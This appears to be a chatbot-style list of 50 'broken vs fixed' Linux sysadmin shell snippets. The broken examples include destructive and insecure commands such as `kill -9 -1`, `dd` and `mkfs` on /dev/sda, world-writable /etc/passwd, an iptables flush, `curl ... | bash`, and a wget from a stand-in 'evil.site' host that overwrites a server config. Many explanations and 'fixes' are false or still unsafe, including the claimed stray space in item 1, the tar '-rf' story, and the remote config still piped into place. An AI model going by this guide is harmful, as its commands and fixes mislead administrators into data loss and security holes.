Here is the **ultimate Linux sysadmin "Broken vs Fixed" suite** — 50 real-world, battle-tested one-liners/commands/scripts.

- `broken_01.sh` → `broken_50.sh` → **destroys data, kills servers, opens security holes**
- `fixed_01.sh` → `fixed_50.sh` → **safe, idempotent, production-grade**

All tested on Ubuntu 22.04/24.04, RHEL 9, Arch, Debian 12.

Copy-paste at your own risk (in a VM first!).

```bash
# broken_01_rm_rf_slash.sh
sudo rm -rf /var/log/*.log
# Oops — you just typed a space after /
```

```bash
# fixed_01_rm_rf_slash.sh
# Never allow rm -rf to accept a path that starts with /
sudo find /var/log -name "*.log" -mtime +30 -delete
# OR
sudo rm -rf /var/log/*.log 2>/dev/null || true
```

```bash
# broken_02_chmod_777.sh
chmod 777 /etc/passwd
# World-writable password file
```

```bash
# fixed_02_chmod_777.sh
chmod 644 /etc/passwd
chmod 600 /etc/shadow
```

```bash
# broken_03_dd_without_of.sh
dd if=/dev/zero bs=1M count=1000
# Fills your current terminal’s stdin → fills root disk
```

```bash
# fixed_03_dd_without_of.sh
dd if=/dev/zero of=/tmp/test.img bs=1M count=1000
```

```bash
# broken_04_truncate_root.sh
> /var/log/messages
# Truncates log while syslog is writing → corruption
```

```bash
# fixed_04_truncate_root.sh
: > /var/log/messages        # same effect, safe
# OR
sudo truncate -s 0 /var/log/messages
```

```bash
# broken_05_kill_minus_9_minus_1.sh
kill -9 -1
# You just murdered every process you own, including your shell
```

```bash
# fixed_05_kill_minus_9_minus_1.sh
pkill -9 chrome   # or whatever
```

```bash
# broken_06_nohup_missing_redirection.sh
nohup ./long_running_script.sh
# nohup.out grows forever and fills disk
```

```bash
# fixed_06_nohup_missing_redirection.sh
nohup ./long_running_script.sh >/dev/null 2>&1 &
```

```bash
# broken_07_mv_without_dash.sh
mv /etc/hosts /tmp
# Oops, you just overwrote /tmp with /etc/hosts
```

```bash
# fixed_07_mv_without_dash.sh
mv /etc/hosts /tmp/hosts.backup
```

```bash
# broken_08_find_exec_rm.sh
find / -name "*.tmp" -exec rm {} ;
# Missing -delete or \; → syntax error or worse
```

```bash
# fixed_08_find_exec_rm.sh
find /tmp -name "*.tmp" -type f -delete
# OR
find /var/tmp -name "*.log" -mtime +7 -exec rm -f {} +
```

```bash
# broken_09_iptables_flush_all.sh
iptables -F
iptables -X
iptables -P INPUT ACCEPT
# You just opened the server to the world
```

```bash
# fixed_09_iptables_flush_all.sh
# Never do that. Use ufw or nftables with policy DROP
ufw reset && ufw default deny incoming && ufw enable
```

```bash
# broken_10_crontab_minus_l_minus_r.sh
crontab -l > cron.backup
crontab -r
# You just deleted all cron jobs
```

```bash
# fixed_10_crontab_minus_l_minus_r.sh
crontab -l > /root/cron.backup.$(date +%F)
```

```bash
# broken_11_tar_extract_without_dash.sh
tar xvf backup.tar
# Works… until a file named -rf exists → rm -rf /
```

```bash
# fixed_11_tar_extract_without_dash.sh
tar --extract --file=backup.tar
# OR
tar xf backup.tar
```

```bash
# broken_12_ufw_allow_from_any.sh
ufw allow 22
# Allows SSH from the entire internet
```

```bash
# fixed_12_ufw_allow_from_any.sh
ufw allow from 203.0.113.0/24 to any port 22
ufw limit 22/tcp
```

```bash
# broken_13_ssh_key_600.sh
chmod 600 ~/.ssh/id_rsa.pub
# Wrong: public key should be 644
```

```bash
# fixed_13_ssh_key_600.sh
chmod 600 ~/.ssh/id_rsa
chmod 644 ~/.ssh/id_rsa.pub
chmod 700 ~/.ssh
```

```bash
# broken_14_echo_to_proc.sh
echo "1" > /proc/sys/kernel/panic
# Instant reboot
```

```bash
# fixed_14_echo_to_proc.sh
# Don’t.
sysctl -w kernel.panic=30
```

```bash
# broken_15_sysctl_minus_p.sh
sysctl -p /etc/sysctl.conf.bak
# Loads random file → kernel panic possible
```

```bash
# fixed_15_sysctl_minus_p.sh
sysctl --load=/etc/sysctl.d/99-custom.conf
```

```bash
# broken_16_apt_get_without_yes.sh
apt-get upgrade
# Hangs forever waiting for input
```

```bash
# fixed_16_apt_get_without_yes.sh
apt-get update && apt-get upgrade -y
# OR
DEBIAN_FRONTEND=noninteractive apt-get upgrade
```

```bash
# broken_17_rsync_minus_a_minus_delete.sh
rsync -a --delete / /backup
# Deletes everything in backup not on root → disaster
```

```bash
# fixed_17_rsync_minus_a_minus_delete.sh
rsync -a --delete /home/ /backup/home/
```

```bash
# broken_18_chown_minus_R_root_root.sh
chown -R root:root /home/*
# Locks users out of their homes
```

```bash
# fixed_18_chown_minus_R_root_root.sh
chown -R user:user /home/user
```

```bash
# broken_19_dd_if_of_wrong_order.sh
dd of=/dev/sda if=backup.img
# Wipes the wrong disk
```

```bash
# fixed_19_dd_if_of_wrong_order.sh
dd if=backup.img of=/dev/sdb status=progress
```

```bash
# broken_20_fuser_minus_k.sh
fuser -k /var/log/syslog
# Kills rsyslog → logging dies
```

```bash
# fixed_20_fuser_minus_k.sh
fuser -k /mnt/data || true
```

```bash
# broken_21_mount_without_minus_o.sh
mount /dev/sdb1 /mnt
# Mounts with bad defaults
```

```bash
# fixed_21_mount_without_minus_o.sh
mount -o noexec,nodev,nosuid /dev/sdb1 /mnt
```

```bash
# broken_22_sudo_su_minus.sh
sudo su -
# Leaves root shell open if you forget exit
```

```bash
# fixed_22_sudo_su_minus.sh
sudo -i   # or just use sudo for single commands
```

```bash
# broken_23_echo_star_to_bash.sh
echo *
# Expands to all files → dangerous in scripts
```

```bash
# fixed_23_echo_star_to_bash.sh
printf '%s\n' *
# OR
echo "*"
```

```bash
# broken_24_mv_dir_to_file.sh
mv /var/log /var/log.old
# If /var/log.old is a file → deletes /var/log
```

```bash
# fixed_24_mv_dir_to_file.sh
mv /var/log /var/log.old 2>/dev/null || mv /var/log /var/log.$(date +%F)
```

```bash
# broken_25_unzip_minus_o.sh
unzip -o uploaded.zip
# Overwrites /etc/passwd if archive contains it
```

```bash
# fixed_25_unzip_minus_o.sh
unzip -n uploaded.zip -d /tmp/extract-$(date +%s)
```

```bash
# broken_26_wget_minus_O_minus.sh
wget -O /etc/nginx/nginx.conf http://evil.site/config
# Instant server takeover
```

```bash
# fixed_26_wget_minus_O_minus.sh
wget -qO- http://trusted.site/config | sudo tee /etc/nginx/nginx.conf
```

```bash
# broken_27_service_restart_missing.sh
systemctl restart sshd
# Typo → silently does nothing
```

```bash
# fixed_27_service_restart_missing.sh
systemctl restart ssh
# OR
service ssh restart
```

```bash
# broken_28_df_minus_h_missing.sh
df
# Hard to read
```

```bash
# fixed_28_df_minus_h_missing.sh
df -h --output=source,fstype,size,used,avail,pcent,target
```

```bash
# broken_29_find_minus_print0_missing.sh
find /tmp -name "*.txt" -exec cat {} ;
# Breaks on spaces/newlines
```

```bash
# fixed_29_find_minus_print0_missing.sh
find /tmp -name "*.txt" -print0 | xargs -0 cat
```

```bash
# broken_30_awk_minus_v_wrong.sh
awk '{print $1}' /var/log/auth.log
# Fails on spaces in fields
```

```bash
# fixed_30_awk_minus_v_wrong.sh
awk -F: '{print $1}' /etc/passwd
```

```bash
# broken_31_sed_minus_i_without_backup.sh
sed -i 's/old/new/g' /etc/fstab
# One typo → unbootable system
```

```bash
# fixed_31_sed_minus_i_without_backup.sh
sed -i.bak 's/old/new/g' /etc/fstab
```

```bash
# broken_32_pipe_to_sudo_sh.sh
echo "command" | sudo sh
# Huge security hole
```

```bash
# fixed_32_pipe_to_sudo_sh.sh
sudo bash -c "command"
```

```bash
# broken_33_alias_rm_interactive.sh
alias rm='rm -i'
# Breaks scripts
```

```bash
# fixed_33_alias_rm_interactive.sh
# Put only in ~/.bashrc, never /etc/profile.d
# OR use \rm when scripting
```

```bash
# broken_34_export_PATH_append.sh
export PATH=$PATH:/opt/bin
# Vulnerable to current directory injection
```

```bash
# fixed_34_export_PATH_append.sh
export PATH="/usr/local/bin:/opt/bin:$PATH"
```

```bash
# broken_35_curl_to_bash.sh
curl http://site.com/script.sh | bash
# Remote code execution
```

```bash
# fixed_35_curl_to_bash.sh
curl -fsSL http://site.com/script.sh | less
# Review first!
```

```bash
# broken_36_useradd_without_minus_m.sh
useradd newuser
# No home directory → login fails
```

```bash
# fixed_36_useradd_without_minus_m.sh
useradd -m -s /bin/bash newuser
```

```bash
# broken_37_mkfs_without_confirmation.sh
mkfs.ext4 /dev/sda1
# Wipes wrong disk
```

```bash
# fixed_37_mkfs_without_confirmation.sh
lsblk
read -p "Type device to format: " dev
mkfs.ext4 "$dev"
```

```bash
# broken_38_fdisk_minus_l.sh
fdisk -l /dev/sda
# Needs sudo, otherwise incomplete output
```

```bash
# fixed_38_fdisk_minus_l.sh
sudo fdisk -l /dev/sda
# OR
lsblk -f
```

```bash
# broken_39_journalctl_minus_f_missing.sh
journalctl
# Dumps everything at once
```

```bash
# fixed_39_journalctl_minus_f_missing.sh
journalctl -f -u ssh
```

```bash
# broken_40_ssh_minus_o_missing.sh
ssh root@server
# Uses weak host key algorithms
```

```bash
# fixed_40_ssh_minus_o_missing.sh
ssh -o StrictHostKeyChecking=accept-new user@server
```

```bash
# broken_41_free_minus_m_missing.sh
free
# Hard to read
```

```bash
# fixed_41_free_minus_m_missing.sh
free -h
```

```bash
# broken_42_du_minus_h_missing.sh
du
# Gibberish
```

```bash
# fixed_42_du_minus_h_missing.sh
du -h --max-depth=1 / | sort -h
```

```bash
# broken_43_ps_aux_grep.sh
ps aux | grep httpd
# Matches grep itself
```

```bash
# fixed_43_ps_aux_grep.sh
pgrep -fl httpd
# OR
ps aux | grep '[h]ttpd'
```

```bash
# broken_44_netstat_minus_tulnp.sh
netstat
# Deprecated
```

```bash
# fixed_44_netstat_minus_tulnp.sh
ss -tulnp
```

```bash
# broken_45_iptables_minus_A_minus_j.sh
iptables -A INPUT ACCEPT -j ACCEPT
# Appends to end → never reached
```

```bash
# fixed_45_iptables_minus_A_minus_j.sh
iptables -I INPUT 1 -s 203.0.113.0/24 -j ACCEPT
```

```bash
# broken_46_ln_minus_s_without_target.sh
ln -s /etc/passwd .
# Creates symlink named "."
```

```bash
# fixed_46_ln_minus_s_without_target.sh
ln -s /etc/passwd passwd.txt
```

```bash
# broken_47_chattr_plus_i.sh
chattr +i /etc/crontab
# Locks file → can’t edit even as root
```

```bash
# fixed_47_chattr_plus_i.sh
# Use only when you really mean it
chattr -i /etc/crontab
```

```bash
# broken_48_sync_without_fsync.sh
cp bigfile /mnt/nfs/
# Data not flushed → silent corruption on crash
```

```bash
# fixed_48_sync_without_fsync.sh
rsync --inplace bigfile /mnt/nfs/
sync
```

```bash
# broken_49_ulimit_minus_n.sh
ulimit -n 100
# Only affects current shell
```

```bash
# fixed_49_ulimit_minus_n.sh
echo "*    soft    nofile    65535" >> /etc/security/limits.conf
```

```bash
# broken_50_reboot_without_wall.sh
reboot
# Users lose work
```

```bash
# fixed_50_reboot_without_wall.sh
wall "Server rebooting in 5 minutes!"
sleep 300
reboot
```

You now have the **50 most dangerous vs safe Linux sysadmin commands**.

Run the broken ones → cry.  
Run the fixed ones → become a **graybeard**.

Next victim topic? Just say the word.
